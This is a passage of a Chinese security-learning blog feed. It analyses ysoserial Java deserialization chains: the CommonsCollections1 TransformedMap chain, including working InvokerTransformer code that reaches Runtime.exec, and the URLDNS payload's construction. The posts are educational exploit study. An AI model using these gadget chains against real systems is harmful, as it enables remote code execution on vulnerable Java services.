方法中存在</li><li>根据 1. 和 2. 并结合Poc来进行推测：该Poc在试图调用到 <code>TransformedMap.checkSetValue()</code> , <code>TransformedMap.transformKey()</code> , <code>TransformedMap.transformValue()</code> 这三者之一来执行 <code>InvokerTransformer.transform()</code>，从而RCE。</li></ol><h3 id="分析gadgets"><a href="#分析gadgets" class="headerlink" title="分析gadgets"></a>分析gadgets</h3><p>这一节我们仅分析 gadgets，目的是理解 gadgets 中如何触发到RCE的（这个漏洞的RCE点是 InvokerTransformer类的 <code>transform()</code> 方法）。所以我们先不找反序列化入口点，先手工调用 gadgets手工触发RCE，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="comment">//Runtime.exec() 执行的命令</span></span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//通过调用 TransformedMap.put() 来触发</span></span><br><span class="line">outerMap.put(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;tt&quot;</span>);</span><br></pre></td></tr></table></figure><p>简单画了个流程图，当然自己动手跟代码理解起来效果更好</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/1.png" width="1000px"><br><h4 id="关于-InvokerTransformer-反射调用的细节"><a href="#关于-InvokerTransformer-反射调用的细节" class="headerlink" title="关于 InvokerTransformer 反射调用的细节"></a>关于 InvokerTransformer 反射调用的细节</h4><p>估计大家都看到了，Poc中为了执行 <code>xcalc</code>命令，连续用了三次<code>InvokerTransformer()</code>才得解。为什么需要调用那么多次呢？</p><p><strong>首先，</strong>我们得先了解下，<code>.class</code>；<code>.class.getClass()</code>；<code>实例.getClass()</code> 之间都有什么区别。我们可以使用如下代码来测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Runtime.class); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">System.out.println(Runtime.class.getClass()); <span class="comment">//class java.lang.Class</span></span><br><span class="line">System.out.println(Runtime.getRuntime().getClass()); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">System.out.println(Runtime.getRuntime().getClass().getClass()); <span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure><br><p>了解完毕后回到漏洞上来，这是一个反序列化漏洞，Payload需要被序列化。若我们直接给 ConstantTransformer类传入 <code>Runtime.getRuntime()</code> ，会由于 Runtime 没有实现 Serializable 接口而在序列化时报错。</p><p>所以为了能够让 <code>InvokerTransformer.transform()</code> 反射 Runtime类。Poc中采取了折中的办法，这里将Poc和InvokerTransformer抽象成下面的代码，方便理解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得一个Class对象</span></span><br><span class="line">Class aClass = Runtime.class.getClass();</span><br><span class="line"><span class="comment">//这里的getMethod是为了和下文的 aClass1 打配合</span></span><br><span class="line">Method getMethod = aClass.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">Object getRuntime = getMethod.invoke(Runtime.class, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//以上三行操作相当于:</span></span><br><span class="line"><span class="comment">//Method getRuntime1 = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">System.out.println(getRuntime); <span class="comment">//public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line">System.out.println(getRuntime.getClass()); <span class="comment">//class java.lang.reflect.Method</span></span><br><span class="line"> </span><br><span class="line">Class aClass1 = getRuntime.getClass();</span><br><span class="line">Method invoke = aClass1.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;);</span><br><span class="line">Object invoke1 = invoke.invoke(getRuntime, <span class="keyword">new</span> Object[]&#123;Runtime.class, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//以上三行操作相当于:</span></span><br><span class="line"><span class="comment">//Object invoke3 = getRuntime.invoke(Runtime.class);</span></span><br><span class="line">System.out.println(invoke1); <span class="comment">//java.lang.Runtime@14ae5a5</span></span><br><span class="line">System.out.println(invoke1.getClass()); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line">Class aClass2 = invoke1.getClass();</span><br><span class="line">Method exec = aClass2.getMethod(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;);</span><br><span class="line">Object invoke2 = exec.invoke(invoke1, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>至此gadgets就分析完了，接下来开始寻找能够跳到 TransformedMap触发点 的反序列化入口点了。</p><br><h1 id="readObject-AnnotationInvocationHandler"><a href="#readObject-AnnotationInvocationHandler" class="headerlink" title="readObject() - AnnotationInvocationHandler"></a>readObject() - AnnotationInvocationHandler</h1><p>gadgets这一节最后说，我们需要寻找调用入口点，找到能够调用 <code>TransformedMap</code>类方法的点。</p><p>根据Poc发现其序列化了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>类，并将 gadgets中最后一行经过 <code>TransformedMap.decorate()</code> 修饰的 <code>Map outerMap</code> 传入其构造方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = declaredConstructor.newInstance(Retention.class, outerMap);</span><br><span class="line">....<span class="comment">//对 o 进行序列化和反序列化操作</span></span><br></pre></td></tr></table></figure><p>这个漏洞是一个反序列化漏洞，所以我们应当去瞄瞄 AnnotationInvocationHandler类的 <code>readObject()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.reflect.annotation;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    </span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//调用了setValue()。 </span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该<code>readObject()</code> 的流程，可分为两个并行分支：</p><ol><li>调用到 TransformedMap 的代码 <code>setValue()</code>，他是如何调用到 TransformedMap 的？</li><li>进入 <code>setValue()</code>之前有一判断 <code>if (var7 != null)</code>，如何确保一定能进入这个分支？</li></ol><br><h2 id="如何调用到TransformedMap"><a href="#如何调用到TransformedMap" class="headerlink" title="如何调用到TransformedMap"></a>如何调用到TransformedMap</h2><p>我们发现 <code>readObject()</code>方法 中和 <code>setValue()</code> 相关的类成员是 Map类型的<code>memberValues</code>。而Poc强制实例化 AnnotationInvocationHandler类 时就将 <code>memberValues</code> 设置为 TransformedMap类型的 <code>outerMap</code>了。所以 AnnotationInvocationHandler类 中对 var4、var5 的操作我们去到 TransformedMap类去看源码和调试即可。</p><p>TransformedMap 关系图如下（红圆点是关键类）：</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/2.png" width="600px"><p>经过调试和代码追踪可了解到触发流程：</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/3.png" width="1000px"><br><h2 id="如何进入if判断"><a href="#如何进入if判断" class="headerlink" title="如何进入if判断"></a>如何进入if判断</h2><p>进入 if判断 的代码中，有几个重要的变量。具体这些变量是如何被赋值的就不详细写出来了，自行跟进一下代码就能知道。我也不想把一堆篇幅写在跟着代码跳来跳去上。这里仅说思路和流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在Poc中，一些类成员已经被赋值：</span></span><br><span class="line"><span class="comment">//this.memberValues 为 TransformerMap</span></span><br><span class="line"><span class="comment">//this.type 为 Retention.class</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里是注解的操作</span></span><br><span class="line">AnnotationType var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line"><span class="comment">//获取注解中 所有方法 及其 返回值 的Map</span></span><br><span class="line">Map var3 = var2.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取TransformerMap iterator</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Entry var5 = (Entry)var4.next();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取 TransformerMap 的key</span></span><br><span class="line">    String var6 = (String)var5.getKey();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//查看Retention是否有方法名为var6的方法</span></span><br><span class="line">    <span class="comment">//Retention注解只有一个方法：RetentionPolicy value()</span></span><br><span class="line">    <span class="comment">//所以var6必须为 &quot;value&quot; 才能顺利获得 var7</span></span><br><span class="line">    Class var7 = (Class)var3.get(var6);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object var8 = var5.getValue();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//只要TransformerMap的value不是RetentionPolicy类型就没有问题</span></span><br><span class="line">        <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            var5.setValue(.....);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下这一节，其实这个if判断的思想是：只有Map的key值和注解的方法名一致，才会调用 <code>setValue()</code>。</p><br><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CC1 TransformedMap 链的核心思路如下：</p><ol><li><p><code>InvokerTransformer.transform()</code> 中存在可控的反射操作</p></li><li><p><code>ChainedTransformer.transform()</code> 对 <code>Transformer[]</code> 遍历调用 <code>transform()</code>，为执行多段反射提供了可能</p></li><li><p>执行到 <code>ChainedTransformer.transform()</code> 的入口为:</p><p><code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code></p></li><li><p>反序列化入口点 为 <code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>，该方法执行了 可控Map类型 类成员的 <code>setValue()</code> 操作</p></li></ol><p>最后提一下，<strong>jdk &gt;= 8u71</strong> 这条链子就失效了。这是因为 AnnotationInvocationHandler类的 <code>readObject()</code> 代码有变化。原本的 <code>setValue()</code> 没了。唯一有点希望的 <code>var7.put(var10, var11)</code> 结果 var7 是个新new的LinkedHashMap，不可控。所以就冇得了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//var4就是反序列化时的属性 memberValues</span></span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    <span class="comment">//首先，var7是新new的一个LinkedHashMap()，不可控</span></span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        <span class="comment">//其次调用的是 AbstractInputCheckedMapDecorator.MapEntry.next()</span></span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        <span class="comment">//可惜这里getKey()并不能触发到 TransformedMap</span></span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//可惜这里getValue()也不能触发到 TransformedMap</span></span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ol><li><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/">Java Class Object</a></li><li>【代码审计】知识星球 - Java安全漫谈</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;看完URLDNS之后再看CC链，，这尼玛简直就是一个天一个地。。前前后后大概看了三四天才能勉强说是理解了。然后又花了两天多来写这篇文章。。我感觉我尽力了，，不知道是不是因为我的思维方式还停留在php上，感觉java的文章真是有点难写。。。也许是我太想把每个流程调用都贴出来吧。。后面我会学习下大佬们都是怎么写java文的。。这篇文章就先将就着这样看吧，我尽力了555。。。&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/categories/java/ysoserial/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/tags/ysoserial/"/>
    
    <category term="CC链" scheme="http://example.com/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial学习之 - URLDNS</title>
    <link href="http://example.com/2021/05/12/2021-05-12-ysoserial-urldns/"/>
    <id>http://example.com/2021/05/12/2021-05-12-ysoserial-urldns/</id>
    <published>2021-05-12T09:02:12.000Z</published>
    <updated>2021-05-12T09:20:07.507Z</updated>
    
    <content type="html"><![CDATA[<p>大概学了一个多月Java，感觉有点底子了以后，终于开始学习Java相关漏洞了。搓搓手 ==</p><p>开个ysoserial的新坑。。日后慢慢填 = =</p><span id="more"></span><br><h1 id="ysoserial基础使用"><a href="#ysoserial基础使用" class="headerlink" title="ysoserial基础使用"></a>ysoserial基础使用</h1><p>生成POC的地方是 <code>GeneratePayload</code>类的 main 方法。</p><br><p>而调试链子的地方为 <code>PayloadRunner</code>类。每个Payload类都会有一个 main方法，会调用 <code>PayloadRunner</code>类的 run 方法。该方法会将 gadgets 序列化后再反序列化回来。使得我们可以跟进链子。</p><br><h1 id="URLDNS-Poc"><a href="#URLDNS-Poc" class="headerlink" title="URLDNS Poc"></a>URLDNS Poc</h1><p>定位到 ysoserial 的 <code>URLDNS.java</code>。查看 <code>getObject()</code> 方法</p><p>以下注释为ysoserial源码的注释翻译，现在可以不用深入理解，后文会分析为什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//为了避免生成Payload时触发到DNS解析，ysoserial 自定了一个 SilentURLStreamHandler 类</span></span><br><span class="line">    <span class="comment">//(具体为什么这样做就能避免，会在后文分析。现在可暂时不管)</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">//将要存放URL的HashMap</span></span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">//作为HashMap key值 的URL</span></span><br><span class="line">    ht.put(u, url); <span class="comment">//触发DNS解析的关键在于key(put的第一个参数)，value无所谓</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行了上面的put()操作，URL的hashCode已经被计算过并存在变量u中</span></span><br><span class="line">    <span class="comment">//但只有调用了 hashCode() 方法才会进行DNS解析</span></span><br><span class="line">    <span class="comment">//所以我们需要手动将其hashCode重置为-1。好让它作为Payload时能够正常调用 hashCode()</span></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ysoserial自定的类。继承 URLStreamHandler</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="配置IDEA"><a href="#配置IDEA" class="headerlink" title="配置IDEA"></a>配置IDEA</h1><p>环境：JDK1.8</p><br><p>配置 IDEA 的 Run/Debug Configurations：先运行 URLDNS 的 <code>main()</code> 函数使 IDEA Configurations 自动添加对应的配置。此时由于没有设置参数，肯定会报错，不需理会。</p><p>然后再设置 Program arguments 为Dnslog 地址：</p><img src="/2021/05/12/2021-05-12-ysoserial-urldns/1.png" width="800px"><p>配置完成后，再运行一次 URLDNS 的 <code>main()</code>，成功触发DNS请求</p><img src="/2021/05/12/2021-05-12-ysoserial-urldns/2.png" width="800px"><br><h1 id="调试反序列化链"><a href="#调试反序列化链" class="headerlink" title="调试反序列化链"></a>调试反序列化链</h1><p>通过查看 ysoserial 的注释可以得知，整个链子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>这个注释已经把链子写的很清楚了，这里就不一一跟进分析，仅说明一些关键的点，并解决下初看Poc时的疑惑。</p><p><strong>调试链子</strong>时，我们仅需要在 <code>HashMap.readObject()</code> 方法的 <code>putVal()</code> 操作上打上断点即可调试。</p><br><h2 id="关键点1-最终触发DNS解析的代码"><a href="#关键点1-最终触发DNS解析的代码" class="headerlink" title="关键点1-最终触发DNS解析的代码"></a>关键点1-最终触发DNS解析的代码</h2><p>漏洞点为 <code>URLStreamHandler.hashCode()</code>。关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//使用了getHostAddress解析URL</span></span><br><span class="line">    <span class="comment">//该函数会执行DNS请求</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="关键点2-为何POC重置hashCode为-1"><a href="#关键点2-为何POC重置hashCode为-1" class="headerlink" title="关键点2-为何POC重置hashCode为-1"></a>关键点2-为何POC重置hashCode为-1</h2><p>gadgets 的最后一个方法为 <code>URL.hashCode()</code>。看一下这个类和方法的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 